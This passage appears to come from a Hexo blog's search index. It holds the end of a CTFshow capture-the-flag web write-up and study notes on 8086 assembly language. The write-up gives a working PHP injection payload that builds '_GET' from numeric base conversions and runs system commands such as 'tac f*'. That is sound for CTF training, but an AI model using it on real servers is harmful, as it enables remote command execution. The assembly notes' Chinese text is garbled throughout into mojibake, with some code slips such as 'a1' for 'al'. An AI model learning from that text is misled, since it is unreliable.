class="hljs-string">&quot;_GET&quot;</span>));<br>&gt;&gt;<span class="hljs-number">1598506324</span><br></code></pre></td></tr></table></figure><p>æ‹¿å‡½æ•°ä½œä¸ºå‚æ•°æ„é€ å‡º<code>c=$_GET[1]($_GET[2])&amp;1=system&amp;2=cat flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;(<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">2</span>&#125;);&amp;<span class="hljs-number">1</span>=system&amp;<span class="hljs-number">2</span>=tac f*<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>CTFshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ±‡ç¼–è¯­è¨€</title>
    <link href="/2025/03/12/Re-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <url>/2025/03/12/Re-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>å»å¹´å­¦çš„ä¸œè¥¿äº†ï¼Œçªç„¶çœ‹åˆ°äº†ï¼Œæƒ³äº†ä¸€ä¸‹è¿˜æ˜¯ä¼ ä¸Šæ¥ï¼Œç‹çˆ½çš„ã€Šæ±‡ç¼–è¯­è¨€ã€‹ç¬¬å››ç‰ˆï¼ˆç¬¬ä¸€æœ¬å®Œå…¨çœ‹å®Œçš„è·Ÿè®¡ç®—æœºæœ‰å…³çš„ä¹¦wwwï¼‰</p><span id="more"></span><h1 id="ä¸€ã€åŸºç¡€çŸ¥è¯†"><a href="#ä¸€ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="ä¸€ã€åŸºç¡€çŸ¥è¯†"></a>ä¸€ã€åŸºç¡€çŸ¥è¯†</h1><h2 id="1-1-æœºå™¨è¯­è¨€"><a href="#1-1-æœºå™¨è¯­è¨€" class="headerlink" title="1.1 æœºå™¨è¯­è¨€"></a>1.1 æœºå™¨è¯­è¨€</h2><h2 id="1-2-æ±‡ç¼–è¯­è¨€äº§ç”Ÿ"><a href="#1-2-æ±‡ç¼–è¯­è¨€äº§ç”Ÿ" class="headerlink" title="1.2 æ±‡ç¼–è¯­è¨€äº§ç”Ÿ"></a>1.2 æ±‡ç¼–è¯­è¨€äº§ç”Ÿ</h2><p>æ±‡ç¼–è¯­è¨€çš„ä¸»ä½“æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œæ±‡ç¼–æŒ‡ä»¤æ˜¯æœºå™¨çš„åŠ©è®°ç¬¦ã€‚</p><h2 id="1-3-æ±‡ç¼–è¯­è¨€çš„ç»„æˆ"><a href="#1-3-æ±‡ç¼–è¯­è¨€çš„ç»„æˆ" class="headerlink" title="1.3 æ±‡ç¼–è¯­è¨€çš„ç»„æˆ"></a>1.3 æ±‡ç¼–è¯­è¨€çš„ç»„æˆ</h2><p>1.æ±‡ç¼–æŒ‡ä»¤ï¼ˆæœºå™¨ç åŠ©è®°ç¬¦ï¼‰</p><p>2.ä¼ªæŒ‡ä»¤ï¼ˆç”±ç¼–è¯‘å™¨ï¼‰</p><p>3.å…¶ä»–ç¬¦å·ï¼ˆç”±ç¼–è¯‘å™¨è¯†åˆ«ï¼‰</p><h2 id="1-4-å­˜å‚¨å™¨"><a href="#1-4-å­˜å‚¨å™¨" class="headerlink" title="1.4 å­˜å‚¨å™¨"></a>1.4 å­˜å‚¨å™¨</h2><p>cpu,å†…å­˜ï¼Œç£ç›˜</p><h2 id="1-5-æŒ‡ä»¤å’Œæ•°æ®"><a href="#1-5-æŒ‡ä»¤å’Œæ•°æ®" class="headerlink" title="1.5 æŒ‡ä»¤å’Œæ•°æ®"></a>1.5 æŒ‡ä»¤å’Œæ•°æ®</h2><h2 id="1-6-å­˜å‚¨å•å…ƒ"><a href="#1-6-å­˜å‚¨å•å…ƒ" class="headerlink" title="1.6 å­˜å‚¨å•å…ƒ"></a>1.6 å­˜å‚¨å•å…ƒ</h2><p>å­˜å‚¨å™¨åˆ†ä¸ºè‹¥å¹²ä¸ªå­˜å‚¨å•å…ƒï¼Œä» 0 å¼€å§‹ç¼–å·</p><h2 id="1-7-CPUå¯¹å­˜å‚¨å™¨è¿›è¡Œè¯»å†™"><a href="#1-7-CPUå¯¹å­˜å‚¨å™¨è¿›è¡Œè¯»å†™" class="headerlink" title="1.7 CPUå¯¹å­˜å‚¨å™¨è¿›è¡Œè¯»å†™"></a>1.7 CPUå¯¹å­˜å‚¨å™¨è¿›è¡Œè¯»å†™</h2><p>CPU å¯¹æ•°æ®è¿›è¡Œè¯»å†™ï¼Œéœ€è¦å’Œå¤–éƒ¨å™¨ä»¶è¿›è¡Œä¿¡æ¯äº¤äº’ï¼š</p><p><strong>1.å­˜å‚¨å•å…ƒåœ°å€ï¼ˆåœ°å€ä¿¡æ¯ï¼‰</strong></p><p><strong>2.å™¨ä»¶çš„é€‰æ‹©ï¼Œè¯»æˆ–å†™å‘½ä»¤ï¼ˆæ§åˆ¶ä¿¡æ¯ï¼‰</strong></p><p><strong>3.è¯»æˆ–å†™çš„æ•°æ®ï¼ˆæ•°æ®ä¿¡æ¯ï¼‰</strong></p><p>è¿æ¥ CPU å’Œå…¶ä»–èŠ¯ç‰‡</p><h2 id="1-8-åœ°å€æ€»çº¿"><a href="#1-8-åœ°å€æ€»çº¿" class="headerlink" title="1.8 åœ°å€æ€»çº¿"></a>1.8 åœ°å€æ€»çº¿</h2><p>CPU é€šè¿‡åœ°å€æ€»çº¿æŒ‡å®šå­˜å‚¨å•å…ƒ</p><p>åœ°å€æ€»çº¿èƒ½ä¼ é€å¤šå°‘ä¸ªä¸åŒçš„ä¿¡æ¯ï¼ŒCPU å°±å¯ä»¥å¯¹å¤šå°‘ä¸ªå­˜å‚¨å•å…ƒè¿›è¡Œå¯»å€ã€‚</p><p>ä¸€ä¸ª CPU æœ‰ N æ ¹åœ°å€æ€»çº¿ï¼Œåˆ™å¯ä»¥è¯´è¿™ä¸ª CPU åœ°å€æ€»çº¿å®½åº¦ä¸º Nï¼ŒCPU å¯ä»¥å¯»æ‰¾ 2 çš„ N æ¬¡æ–¹ä¸ªå†…å­˜å•å…ƒã€‚</p><h2 id="1-9-æ•°æ®æ€»çº¿"><a href="#1-9-æ•°æ®æ€»çº¿" class="headerlink" title="1.9 æ•°æ®æ€»çº¿"></a>1.9 æ•°æ®æ€»çº¿</h2><p>CPUå’Œå…¶ä»–å™¨ä»¶çš„æ•°æ®ä¼ è¾“ï¼Œæ•°æ®æ€»çº¿å®½åº¦å†³å®šäº† CPU å’Œå¤–ç•Œçš„æ•°æ®ä¼ è¾“é€Ÿåº¦ã€‚</p><h2 id="1-10-æ§åˆ¶æ€»çº¿"><a href="#1-10-æ§åˆ¶æ€»çº¿" class="headerlink" title="1.10 æ§åˆ¶æ€»çº¿"></a>1.10 æ§åˆ¶æ€»çº¿</h2><p>CPU å¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶ï¼Œæ§åˆ¶æ€»çº¿æ˜¯ä¸åŒæ§åˆ¶çº¿çš„é›†åˆ</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>1ï¼‰æ±‡ç¼–æŒ‡ä»¤æ˜¯æœºå™¨æŒ‡ä»¤çš„åŠ©è®°ç¬¦ï¼ŒåŒæœºå™¨æŒ‡ä»¤ä¸€ä¸€å¯¹åº”ï¼›</p><p>2ï¼‰æ¯ä¸€ç§ CPU éƒ½æœ‰è‡ªå·±çš„æ±‡ç¼–æŒ‡ä»¤é›†ï¼›</p><p>3ï¼‰CPU å¯ä»¥ç›´æ¥ä½¿ç”¨çš„ä¿¡æ¯åœ¨å­˜å‚¨å™¨ä¸­å­˜æ”¾ï¼›</p><p>4ï¼‰åœ¨å­˜å‚¨å™¨ä¸­æŒ‡ä»¤å’Œæ•°æ®æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼Œéƒ½æ˜¯äºŒè¿›åˆ¶ä¿¡æ¯ï¼›</p><p>5ï¼‰å­˜å‚¨å•å…ƒä»é›¶å¼€å§‹å­˜å‚¨é¡ºåºç¼–å·ï¼›</p><p>6ï¼‰ä¸€ä¸ªå­˜å‚¨å•å…ƒå¯ä»¥å­˜å‚¨ 8 ä¸ª bite(b);</p><p>7)æ¯ä¸€ä¸ª CPU èŠ¯ç‰‡éƒ½æœ‰è®¸å¤šç®¡è„šï¼Œç®¡è„šå’Œæ€»çº¿ç›¸è¿ã€‚</p><p>â€‹<strong>åœ°å€æ€»çº¿å®½åº¦å†³å®šäº† CPU çš„å¯»å€èƒ½åŠ›ï¼›</strong></p><p>â€‹<strong>æ•°æ®æ€»çº¿å®½åº¦å†³å®šäº† CPU ä¸å…¶ä»–å™¨ä»¶è¿›è¡Œæ•°æ®ä¼ æ—¶çš„ä¸€æ¬¡æ•°æ®ä¼ è¾“é‡ï¼›</strong></p><p>â€‹<strong>æ§åˆ¶æ€»çº¿å®½åº¦å†³å®šäº† CPU å¯¹ç³»ç»Ÿä¸­å…¶ä»–å™¨ä»¶çš„æ§åˆ¶èƒ½åŠ›ã€‚</strong></p><h2 id="1-11-ä¸»æ¿ã€æ¥å£å¡"><a href="#1-11-ä¸»æ¿ã€æ¥å£å¡" class="headerlink" title="1.11 ä¸»æ¿ã€æ¥å£å¡"></a>1.11 ä¸»æ¿ã€æ¥å£å¡</h2><h2 id="1-12-å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡"><a href="#1-12-å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡" class="headerlink" title="1.12 å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡"></a>1.12 å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡</h2><p><strong>éšæœºå­˜å‚¨å™¨ï¼ˆRAMï¼‰ã€åªè¯»å­˜å‚¨å™¨ï¼ˆROMï¼‰</strong></p><p>éšæœºå­˜å‚¨å™¨ RAM</p><p>è£…æœ‰ BIOS çš„ ROM</p><p>æ¥å£å¡ä¸Šçš„ RAM</p><h2 id="1-13å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡"><a href="#1-13å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡" class="headerlink" title="1.13å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡"></a>1.13å„ç±»å­˜å‚¨å™¨èŠ¯ç‰‡</h2><h5 id="è£…æœ‰-BIOS-çš„-ROM"><a href="#è£…æœ‰-BIOS-çš„-ROM" class="headerlink" title="è£…æœ‰ BIOS çš„ ROM"></a>è£…æœ‰ BIOS çš„ ROM</h5><p>BIOSï¼šåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿ</p><h2 id="1-15å†…å­˜åœ°å€ç©ºé—´"><a href="#1-15å†…å­˜åœ°å€ç©ºé—´" class="headerlink" title="1.15å†…å­˜åœ°å€ç©ºé—´"></a>1.15å†…å­˜åœ°å€ç©ºé—´</h2><p>å­˜å‚¨å™¨åœ¨ç‰©ç†ä¸Šæ˜¯ç‹¬ç«‹å™¨ä»¶ï¼Œç›¸åŒç‚¹ï¼šéƒ½é€šè¿‡ CPU å’Œæ€»çº¿ç›¸è¿ï¼ŒCPU è¿›è¡Œè¯»å†™æ—¶éƒ½é€šè¿‡æ§åˆ¶çº¿å‘å‡ºå†…å­˜è¯»å†™å‘½ä»¤ã€‚</p><h1 id="äºŒã€å¯„å­˜å™¨ï¼ˆCPU-å·¥ä½œåŸç†ï¼‰"><a href="#äºŒã€å¯„å­˜å™¨ï¼ˆCPU-å·¥ä½œåŸç†ï¼‰" class="headerlink" title="äºŒã€å¯„å­˜å™¨ï¼ˆCPU å·¥ä½œåŸç†ï¼‰"></a>äºŒã€å¯„å­˜å™¨ï¼ˆCPU å·¥ä½œåŸç†ï¼‰</h1><p>ä¸€ä¸ª 16 ä½å¯„å­˜å™¨å¯ä»¥å­˜å‚¨æ•°æ®æœ€å¤§å€¼ä¸º 2^16-1</p><h2 id="2-1-é€šç”¨å¯„å­˜å™¨"><a href="#2-1-é€šç”¨å¯„å­˜å™¨" class="headerlink" title="2.1 é€šç”¨å¯„å­˜å™¨"></a>2.1 é€šç”¨å¯„å­˜å™¨</h2><p>AX çš„ä½å…«ä½ï¼ˆ0ä½-7ä½ï¼‰æ„æˆäº† AL å¯„å­˜å™¨ï¼Œé«˜8ä½ï¼ˆ8 ä½-15 ä½ï¼‰æ„æˆäº† AH å¯„å­˜å™¨ã€‚</p><p>AH å’Œ AL å¯„å­˜å™¨æ˜¯å¯ä»¥ç‹¬ç«‹ä½¿ç”¨çš„ 8 ä½å¯„å­˜å™¨ã€‚</p><h2 id="2-2-æ±‡ç¼–æŒ‡ä»¤"><a href="#2-2-æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="2.2 æ±‡ç¼–æŒ‡ä»¤"></a>2.2 æ±‡ç¼–æŒ‡ä»¤</h2><p><strong>æ±‡ç¼–æŒ‡ä»¤ä¸åŒºåˆ†å¤§å°å†™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,18         å°†18é€å…¥AXä¸­       AX=18<br>mov ah,78å°†78é€å…¥AH                            AH=78<br>add ax,8å°†å¯„å­˜å™¨ä¸­AXä¸­çš„æ•°æ®åŠ ä¸Š8 AX=AX+8<br>mov ax,bxå°†BXä¸­çš„æ•°æ®é€å…¥AXä¸­AX=BX<br>add ax,bxå°†AXï¼ŒBXä¸­çš„å†…å®¹ç›¸åŠ ï¼Œç»“æœå­˜åœ¨AXä¸­AX=AX+BX<br></code></pre></td></tr></table></figure><h2 id="2-3-ç‰©ç†åœ°å€"><a href="#2-3-ç‰©ç†åœ°å€" class="headerlink" title="2.3 ç‰©ç†åœ°å€"></a>2.3 ç‰©ç†åœ°å€</h2><p>CPUè®¿é—®å†…å­˜å•å…ƒæ—¶ç»™å‡ºå†…å­˜å•å…ƒçš„åœ°å€ã€‚æ‰€æœ‰çš„å†…å­˜å•å…ƒæ„æˆçš„å­˜å‚¨ç©ºé—´æ˜¯ä¸€ä¸ªä¸€ç»´çš„çº¿æ€§ç©ºé—´ï¼Œè¿™ä¸ªå”¯ä¸€åœ°å€æˆä¸ºç‰©ç†åœ°å€ã€‚</p><h2 id="2-4-16-ä½ç»“æ„çš„-CPU"><a href="#2-4-16-ä½ç»“æ„çš„-CPU" class="headerlink" title="2.4 16 ä½ç»“æ„çš„ CPU"></a>2.4 16 ä½ç»“æ„çš„ CPU</h2><p>16 ä½ç»“æ„è¿ç®—å™¨ä¸€æ¬¡æœ€å¤šå¯ä»¥å¤„ç† 16 ä½æ•°æ®ï¼Œå¯„å­˜å™¨æœ€å¤§å®½åº¦ä¸º 16 ä½ï¼Œå¯„å­˜å™¨å’Œè¿ç®—å™¨ä¹‹é—´çš„é€šè·¯æ˜¯ 16 ä½çš„ã€‚</p><p><strong>åœ°å€åŠ æ³•å™¨å·¥ä½œåŸç†</strong></p><p>åœ°å€åŠ æ³•å™¨åˆæˆç‰©ç†åœ°å€çš„æ–¹æ³•ï¼š<strong>ç‰©ç†åœ°å€&#x3D;æ®µåœ°å€x16+åç§»åœ°å€</strong></p><p>ç§»ä½æ¬¡æ•°å’Œå„ç§å½¢å¼æ•°æ®å…³ç³»ï¼šå‡ è¿›åˆ¶å·¦ç§»å°±ä¹˜ä»¥å‡ </p><h2 id="2-5-æ®µçš„æ¦‚å¿µ"><a href="#2-5-æ®µçš„æ¦‚å¿µ" class="headerlink" title="2.5 æ®µçš„æ¦‚å¿µ"></a>2.5 æ®µçš„æ¦‚å¿µ</h2><p>å°†è‹¥å¹²åœ°å€è¿ç»­çš„å†…å­˜å•å…ƒçœ‹æˆä¸€ä¸ªæ®µ</p><p>1ï¼‰ä¸€ä¸ªæ®µçš„èµ·å§‹åœ°å€ä¸€å®šæ˜¯ 16 çš„å€æ•°.</p><p>2ï¼‰åç§»åœ°å€ä½ 16 ä½ï¼Œ16 ä½åœ°å€çš„å¯»å€èƒ½åŠ›ä¸º 64kï¼Œæ‰€ä»¥ä¸€ä¸ªæ®µçš„æœ€å¤§é•¿åº¦ä¸º 64kï¼Œ    2^16&#x3D;64</p><h2 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>CPU è®¿é—®å†…å­˜å•å…ƒæ—¶ï¼Œå¿…é¡»æä¾›ç‰©ç†åœ°å€</p><p>CPU å¯ä»¥é€šè¿‡ä¸åŒçš„æ®µåœ°å€å’Œåç§»åœ°å€ç»„æˆç‰©ç†åœ°å€</p><h2 id="2-6-æ®µå¯„å­˜å™¨"><a href="#2-6-æ®µå¯„å­˜å™¨" class="headerlink" title="2.6 æ®µå¯„å­˜å™¨"></a>2.6 æ®µå¯„å­˜å™¨</h2><p>æ®µå¯„å­˜å™¨æ˜¯æä¾›æ®µåœ°å€ï¼Œ8086CPU æœ‰å››ä¸ªæ®µå¯„å­˜å™¨ï¼šCSï¼ŒDSï¼ŒSSï¼ŒESï¼Œå½“ 8086CPU è¦è®¿é—®å†…å­˜æ—¶ï¼Œç”±è¿™å››ä¸ªæ®µå¯„å­˜å™¨æä¾›å†…å­˜å•å…ƒçš„æ®µåœ°å€ã€‚</p><p>CS ä¸ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒIP ä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ã€‚</p><h2 id="2-7-CS-å’Œ-IP"><a href="#2-7-CS-å’Œ-IP" class="headerlink" title="2.7 CS å’Œ IP"></a>2.7 CS å’Œ IP</h2><p>CPU å°† CS å’Œ IP ä¸­çš„å†…å®¹å½“ä½œæŒ‡ä»¤çš„æ®µåœ°å€</p><p><strong>CS å­˜æ”¾æŒ‡ä»¤çš„æ®µåœ°å€ï¼ŒIP å­˜æ”¾æŒ‡ä»¤çš„åç§»åœ°å€</strong></p><p><strong>åŒæ—¶</strong>ä¿®æ”¹ CSã€IP çš„å†…å®¹ï¼š</p><p><strong>jmp æ®µåœ°å€ï¼šåç§»åœ°å€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp 2AE3:3#è·‘åˆ°2AE33<br><br>jmp 3:0B16#è·‘åˆ°00B46H3=00030<br></code></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼šç”¨æŒ‡ä»¤ä¸­ç»™å‡ºçš„æ®µåœ°å€ä¿®æ”¹ CSï¼Œåç§»åœ°å€ä¿®æ”¹ IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ä»…ä¿®æ”¹IPå†…å®¹ï¼šjmp æŸä¸€åˆæ³•å¯„å­˜å™¨<br><br>jmp ax(ç±»ä¼¼äºmov IP,ax)<br><br>jmp bx<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,200H      jmp ax<br></code></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼šç”¨å¯„å­˜å™¨ä¸­çš„å€¼ä¿®æ”¹ IP</p><h2 id="2-8-ä»£ç æ®µ"><a href="#2-8-ä»£ç æ®µ" class="headerlink" title="2.8 ä»£ç æ®µ"></a>2.8 ä»£ç æ®µ</h2><p>å°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µ</p><p>CPU åªè®¤è¢« CSï¼šIP æŒ‡å‘çš„å†…å­˜å•å…ƒä¸­çš„å†…å®¹ä¸ºæŒ‡ä»¤</p><h1 id="ä¸‰ã€å¯„å­˜å™¨ï¼ˆå†…å­˜è®¿é—®ï¼‰"><a href="#ä¸‰ã€å¯„å­˜å™¨ï¼ˆå†…å­˜è®¿é—®ï¼‰" class="headerlink" title="ä¸‰ã€å¯„å­˜å™¨ï¼ˆå†…å­˜è®¿é—®ï¼‰"></a>ä¸‰ã€å¯„å­˜å™¨ï¼ˆå†…å­˜è®¿é—®ï¼‰</h1><h2 id="3-1-å†…å­˜ä¸­å­—çš„å­˜å‚¨"><a href="#3-1-å†…å­˜ä¸­å­—çš„å­˜å‚¨" class="headerlink" title="3.1 å†…å­˜ä¸­å­—çš„å­˜å‚¨"></a>3.1 å†…å­˜ä¸­å­—çš„å­˜å‚¨</h2><p>ä½åœ°å€å­˜ä½ä½ï¼Œé«˜åœ°å€å­˜é«˜ä½</p><p>å­—å‹è€ƒè™‘ä¸¤ä¸ªå­—èŠ‚</p><p>ä¸¤ä¸ªè¿ç»­çš„å†…å­˜å•å…ƒï¼Œ<strong>N å·å•å…ƒå’Œ N+1</strong> å¯ä»¥çœ‹æˆä¸¤ä¸ªå†…å­˜å•å…ƒï¼Œä¹Ÿå¯ä»¥çœ‹æˆä¸€ä¸ªåœ°å€ä¸º N çš„å­—å•å…ƒä¸­çš„é«˜ä½å­—èŠ‚å•å…ƒå’Œä½ä½å­—èŠ‚å•å…ƒã€‚</p><h2 id="3-2-DS-å’Œ-address"><a href="#3-2-DS-å’Œ-address" class="headerlink" title="3.2 DS å’Œ [address]"></a>3.2 DS å’Œ [address]</h2><p>DS æ®µå¯„å­˜å™¨å­˜æ”¾è¦è®¿é—®æ•°æ®çš„æ®µåœ°å€</p><p>mov æŒ‡ä»¤èƒ½**1.å°†æ•°æ®ç›´æ¥é€å…¥å¯„å­˜å™¨ **</p><p>â€‹<strong>2.å°†å¯„å­˜å™¨çš„å†…å®¹é€å…¥å¦ä¸€ä¸ªå¯„å­˜å™¨</strong></p><p>â€‹<strong>3.å°†å†…å­˜å•å…ƒçš„å†…å®¹ä¼ å…¥ä¸€ä¸ªå¯„å­˜å™¨</strong></p><p>mov æŒ‡ä»¤èƒ½å°†<strong>ä¸€ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹</strong>é€å…¥ä¸€ä¸ªå¯„å­˜å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov å¯„å­˜å™¨å,å†…å­˜å•å…ƒåœ°å€<br>e.g   <br>mov bx,1000H<br>mov ds,bx<br>mov a1,[0]//å†…å­˜å•å…ƒåç§»åœ°å€ä¸º 0ï¼Œæ®µåœ°å€é»˜è®¤æ”¾åœ¨ ds ä¸­<br>mov ds,1000H //é”™è¯¯è¡¨è¾¾<br>8086CPU ä¸æ”¯æŒç›´æ¥å°†æ•°æ®é€å…¥æ®µå¯„å­˜å™¨æ“ä½œï¼Œç”¨ bx è¿›è¡Œä¸­è½¬<br></code></pre></td></tr></table></figure><p><strong>æ•°æ®-&gt;é€šç”¨å¯„å­˜å™¨-&gt;æ®µå¯„å­˜å™¨</strong></p><p>å†…å­˜å•å…ƒåˆ°å¯„å­˜å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov å¯„å­˜å™¨åï¼Œå†…å­˜å•å…ƒåœ°å€<br></code></pre></td></tr></table></figure><p>å¯„å­˜å™¨åˆ°å†…å­˜å•å…ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov å†…å­˜å•å…ƒåœ°å€ï¼Œå¯„å­˜å™¨å<br></code></pre></td></tr></table></figure><p>å°† a1 ä¸­çš„æ•°æ®ä¼ å…¥å†…å­˜å•å…ƒ10000H ä¸­</p><p>10000H-&gt;1000:0 åœ°å€1000Hï¼Œåç§»åœ°å€ä¸º0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ds,bx<br>mov [0],a1<br></code></pre></td></tr></table></figure><h2 id="3-3-å­—çš„ä¼ é€"><a href="#3-3-å­—çš„ä¼ é€" class="headerlink" title="3.3 å­—çš„ä¼ é€"></a>3.3 å­—çš„ä¼ é€</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ds,bx<br>mov ax,[0]//1000:0å¤„çš„å­—å‹æ•°æ®é€å…¥ax<br>mov [0],cx//cxä¸­çš„16ä½æ•°æ®é€åˆ°1000:0å¤„<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c92c75e501ca30e3.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/e95d6014994bccc2.png"></p><h2 id="3-4-movã€addã€sub-æŒ‡ä»¤"><a href="#3-4-movã€addã€sub-æŒ‡ä»¤" class="headerlink" title="3.4 movã€addã€sub æŒ‡ä»¤"></a>3.4 movã€addã€sub æŒ‡ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov/add/sub  å¯„å­˜å™¨ï¼Œæ•°æ®mov ax,8<br>mov/add/sub  å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨mov ax,bx<br>mov/add/sub  å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒmov ax,[0]<br>mov/add/sub  å†…å­˜å•å…ƒï¼Œå¯„å­˜å™¨mov [0],ax<br>mov/add/sub  æ®µå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨mov ds,ax<br></code></pre></td></tr></table></figure><h2 id="3-5-æ•°æ®æ®µ"><a href="#3-5-æ•°æ®æ®µ" class="headerlink" title="3.5 æ•°æ®æ®µ"></a>3.5 æ•°æ®æ®µ</h2><p>å°† 123B0H~123B9H çš„å†…å­˜å•å…ƒå®šä¹‰ä¸ºæ•°æ®æ®µï¼Œç´¯åŠ è¿™ä¸ªæ•°æ®æ®µ çš„å‰ä¸‰ä¸ªå•å…ƒçš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,123BH<br>mov ds,ax//å°†123BHé€å…¥dsä¸­ï¼Œä½œä¸ºæ•°æ®æ®µçš„æ®µåœ°å€<br>mov a1,0//ç”¨a1å­˜æ”¾ç´¯åŠ ç»“æœ<br>add a1,[0]//å°†æ•°æ®æ®µç¬¬ä¸€ä¸ªå•å…ƒï¼ˆåç§»åœ°å€ä¸º0ï¼‰ä¸­çš„æ•°å€¼åŠ åˆ°a1ä¸­<br>add a1,[1]//ä»¥æ­¤ç±»æ¨<br>add a1,[2]<br></code></pre></td></tr></table></figure><p>eg.å†™å‡ æ¡æŒ‡ä»¤ï¼Œç´¯åŠ æ•°æ®æ®µä¸­çš„å‰ä¸‰ä¸ªå­—å‹æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,123BH<br>mov ds,ax<br>mov ax,0<br>add ax,[0]<br>add ax,[2]<br>add ax,[4]<br><br>//ä¸€ä¸ªå­—å ä¸¤ä¸ªå•å…ƒï¼Œåç§»åœ°å€ä¸º0ï¼Œ2ï¼Œ4<br></code></pre></td></tr></table></figure><h2 id="å°ç»“-2"><a href="#å°ç»“-2" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><ul><li>å­—åœ¨å†…å­˜ä¸­å­˜å‚¨æ—¶ï¼Œéœ€è¦ä¸¤ä¸ªè¿ç»­çš„å†…å­˜å•å…ƒï¼Œä½ä½å­—èŠ‚æ”¾ä½åœ°å€å•å…ƒä¸­ï¼Œé«˜ä½æ”¾é«˜åœ°å€ä¸­</li><li>mov æŒ‡ä»¤ä¸­åªç»™å‡ºå•å…ƒçš„åç§»åœ°å€ï¼Œæ®µåœ°å€é»˜è®¤åœ¨ DS å¯„å­˜å™¨ä¸­</li><li>å†…å­˜å’Œå¯„å­˜å™¨ä¼ å­—å‹æ•°æ®æ—¶ï¼Œé«˜åœ°å€å•å…ƒå’Œé«˜ 8 ä½å¯„å­˜å™¨ã€ä½åœ°å€å•å…ƒå’Œä½ 8 ä½å¯„å­˜å™¨ç›¸å¯¹åº”</li><li>mov&#x2F;sub&#x2F;add æœ‰ä¸¤ä¸ªæ“ä½œå¯¹è±¡æŒ‡ä»¤ï¼Œjmp 